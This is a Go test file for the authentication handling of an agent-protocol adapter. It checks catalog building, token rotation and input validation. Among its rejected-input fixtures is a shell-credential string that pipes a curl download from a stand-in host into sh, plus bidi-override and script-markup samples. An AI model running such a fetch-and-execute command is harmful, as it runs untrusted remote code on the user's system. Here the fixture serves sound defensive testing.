package piacp

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/savid/acp-go-pi/internal/pi"
)

func TestAuthMethodsEnumeratesExecutedCatalog(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	generation := harness.seedCatalog(t.Context(), defaultAuthProviders())
	require.NotEmpty(t, generation)

	harness.broker.mu.Lock()
	catalog := harness.broker.catalog
	harness.broker.mu.Unlock()

	require.Equal(t, []authCatalogMethod{
		{ID: authMethodTypeOAuth, Type: authMethodTypeOAuth, Label: "Anthropic (Claude Pro/Max)"},
	}, catalog["anthropic"])
	require.Equal(t, []authCatalogMethod{
		{ID: authMethodTypeAPI, Type: authMethodTypeAPI, Label: "OpenAI API key"},
	}, catalog["openai"])
}

func TestAuthMethodsResultShape(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	harness.seedCatalog(t.Context(), defaultAuthProviders())

	result, err := harness.call(t.Context(), AuthMethodsMethod, map[string]any{authFieldSessionID: string(harness.session.id)})
	require.NoError(t, err)

	encoded, err := json.Marshal(result)
	require.NoError(t, err)

	var decoded map[string]any
	require.NoError(t, json.Unmarshal(encoded, &decoded))
	require.Len(t, decoded, 2)
	require.Contains(t, decoded, "providers")
	require.Contains(t, decoded, "generation")

	providers, ok := decoded["providers"].(map[string]any)
	require.True(t, ok)

	entries, ok := providers["openai"].([]any)
	require.True(t, ok)

	entry, ok := entries[0].(map[string]any)
	require.True(t, ok)
	require.Equal(t, map[string]any{"id": "api", "type": "api", "label": "OpenAI API key"}, entry)
}

// TestAuthMethodsRotatesGeneration pins that each result names itself: two calls
// mint two tokens and the older one no longer authorizes.
func TestAuthMethodsRotatesGeneration(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	first := harness.seedCatalog(t.Context(), defaultAuthProviders())
	second := harness.seedCatalog(t.Context(), defaultAuthProviders())
	require.NotEqual(t, first, second)
}

func TestAuthMethodsRejectsBadParams(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)

	_, err := harness.call(t.Context(), AuthMethodsMethod, map[string]any{"unknown": "x"})
	requireInvalidParams(t, err)

	_, err = harness.call(t.Context(), AuthMethodsMethod, map[string]any{authFieldSessionID: ""})
	requireInvalidParams(t, err)

	_, err = harness.call(t.Context(), AuthMethodsMethod, map[string]any{authFieldSessionID: "missing"})
	require.Error(t, err)
}

// TestAuthMethodsFailsClosedWhenNoCatalogCanBeProduced pins that a bridge that
// never answers takes the leg down rather than publishing an empty catalog.
func TestAuthMethodsFailsClosedWhenNoCatalogCanBeProduced(t *testing.T) {
	t.Parallel()

	harness := newAuthHarness(t)
	harness.scriptBridge(func(_ context.Context, _ pi.AuthRequest) error { return nil })

	_, err := harness.call(t.Context(), AuthMethodsMethod, map[string]any{authFieldSessionID: string(harness.session.id)})
	requireAuthFailed(t, err, authCauseTransport)
}

// TestBuildAuthCatalogDropsUnusableEntries pins deviation D5: one bad label in a
// large catalog is omitted and the leg still succeeds.
func TestBuildAuthCatalogDropsUnusableEntries(t *testing.T) {
	t.Parallel()

	methods, entries := buildAuthCatalog([]pi.AuthProvider{
		{ID: "", Name: "unnamed", API: &pi.AuthAPIEntry{Name: "x"}},
		{ID: "ambient", Name: "Ambient"},
		{ID: "bad-label", API: &pi.AuthAPIEntry{Name: "sneaky\u202ekey"}},
		{ID: "dup", API: &pi.AuthAPIEntry{Name: "first"}},
		{ID: "dup", API: &pi.AuthAPIEntry{Name: "second"}},
		{ID: "both", OAuth: &pi.AuthOAuthEntry{Name: "OAuth", LoginLabel: "Sign in"}, API: &pi.AuthAPIEntry{Name: "Key"}},
	})

	require.NotContains(t, methods, "")
	require.NotContains(t, methods, "ambient")
	require.NotContains(t, methods, "bad-label")
	require.Equal(t, "first", methods["dup"][0].Label)
	require.Equal(t, []authMethodEntry{
		{ID: authMethodTypeOAuth, Type: authMethodTypeOAuth, Label: "Sign in"},
		{ID: authMethodTypeAPI, Type: authMethodTypeAPI, Label: "Key"},
	}, entries["both"])
}

func TestAuthDisplayText(t *testing.T) {
	t.Parallel()

	value, ok := authDisplayText("Anthropic (Claude Pro/Max)", authMaxLabelBytes)
	require.True(t, ok)
	require.Equal(t, "Anthropic (Claude Pro/Max)", value)

	// NFC normalisation runs first and the normalised form is the value.
	normalized, ok := authDisplayText("é", authMaxLabelBytes)
	require.True(t, ok)
	require.Equal(t, "é", normalized)

	for _, bad := range []string{
		"",
		strings.Repeat("x", authMaxLabelBytes+1),
		"line\nbreak",
		"bidi\u202eoverride",
		"\x00null",
		"\ufeffbom",
		string([]byte{0xff, 0xfe}),
	} {
		_, ok := authDisplayText(bad, authMaxLabelBytes)
		require.False(t, ok, bad)
	}
}

func TestAuthDisplayURL(t *testing.T) {
	t.Parallel()

	value, ok := authDisplayURL("https://example.test/authorize?x=1")
	require.True(t, ok)
	require.Equal(t, "https://example.test/authorize?x=1", value)

	for _, bad := range []string{
		"",
		"http://example.test/",
		"https://user:pass@example.test/",
		"https://example.test/#frag",
		"https:///path",
		"https://example.test/" + strings.Repeat("a", authMaxURLBytes),
		"://bad",
	} {
		_, ok := authDisplayURL(bad)
		require.False(t, ok, bad)
	}
}

func TestAuthDisplayUserCode(t *testing.T) {
	t.Parallel()

	value, ok := authDisplayUserCode("ABCD-EFGH")
	require.True(t, ok)
	require.Equal(t, "ABCD-EFGH", value)

	// The pattern is anchored: a substring match would accept markup wrapped
	// around a real code.
	for _, bad := range []string{"", "</script>ABCD", "ABCD EFGH", strings.Repeat("A", authMaxUserCodeBytes+1)} {
		_, ok := authDisplayUserCode(bad)
		require.False(t, ok, bad)
	}
}

func TestAuthLoopbackHost(t *testing.T) {
	t.Parallel()

	for _, loopback := range []string{
		"https://127.0.0.1/cb",
		"https://[::1]/cb",
		"https://LOCALHOST/cb",
		"https://app.localhost/cb",
		"https://provider.test/a?redirect_uri=http%3A%2F%2F127.0.0.1%3A1455%2Fcb",
	} {
		require.True(t, authLoopbackHost(loopback), loopback)
	}

	for _, remote := range []string{
		"https://provider.test/a",
		"https://provider.test/a?redirect_uri=https%3A%2F%2Fprovider.test%2Fcb",
		"https://provider.test/a?redirect_uri=%zz",
		"://bad",
	} {
		require.False(t, authLoopbackHost(remote), remote)
	}
}

// TestValidateAuthInputs pins that pi's catalog declares no prompts, so any
// input names a prompt nobody advertised.
func TestValidateAuthInputs(t *testing.T) {
	t.Parallel()

	require.NoError(t, validateAuthInputs(nil))
	requireInvalidParams(t, validateAuthInputs(map[string]string{"account": "acme"}))

	many := make(map[string]string, authMaxInputsKeys+1)
	for index := range authMaxInputsKeys + 1 {
		many[string(rune('a'+index))] = "v"
	}

	requireInvalidParams(t, validateAuthInputs(many))
	requireInvalidParams(t, validateAuthInputs(map[string]string{"k": strings.Repeat("v", authMaxInputsBytes)}))
}

// TestValidateAuthSecret pins the shell-credential refusal: pi executes a
// credential beginning with "!" and caches its stdout.
func TestValidateAuthSecret(t *testing.T) {
	t.Parallel()

	require.NoError(t, validateAuthSecret("sk-live-value"))

	for _, bad := range []string{
		"",
		"!curl evil.test | sh",
		strings.Repeat("k", authMaxTextInputBytes+1),
		"line\nbreak",
		"carriage\rreturn",
		"bell\a",
		string([]byte{0xff}),
	} {
		requireInvalidParams(t, validateAuthSecret(bad))
	}
}

// TestAuthLoopbackHostIgnoresUnparseableRedirect pins that a redirect target the
// adapter cannot read is not treated as loopback: the mint-time refusal is a
// positive finding, never a parse accident.
func TestAuthLoopbackHostIgnoresUnparseableRedirect(t *testing.T) {
	t.Parallel()

	require.False(t, authLoopbackHost("https://provider.test/a?redirect_uri=http%3A%2F%2F%5B%3A%3A1"))
}
